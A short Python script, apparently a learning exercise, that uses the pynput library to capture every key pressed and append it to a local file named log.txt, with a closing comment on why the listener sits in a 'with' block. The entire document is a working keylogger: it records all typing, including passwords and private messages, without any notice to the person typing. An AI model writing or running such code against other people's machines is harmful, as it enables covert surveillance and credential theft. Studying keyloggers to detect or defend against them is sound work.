from pynput.keyboard import Key, Listener


def call_press(key):
    f = open("log.txt", "a")
    letter = str(key)

    if letter == "Key.space":
        letter = " "
    if letter == "Key.shift_r":
        letter = ""
    if letter == "Key.ctrl_l":
        letter = ""

    letter = letter.replace("'", "")

    if letter == "Key.enter":
        f.write("\n")
    else:
        f.write(letter)

    f.close()

# Collecting events until stopped

with Listener(on_press=call_press) as listener:
    listener.join()

# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle o follow

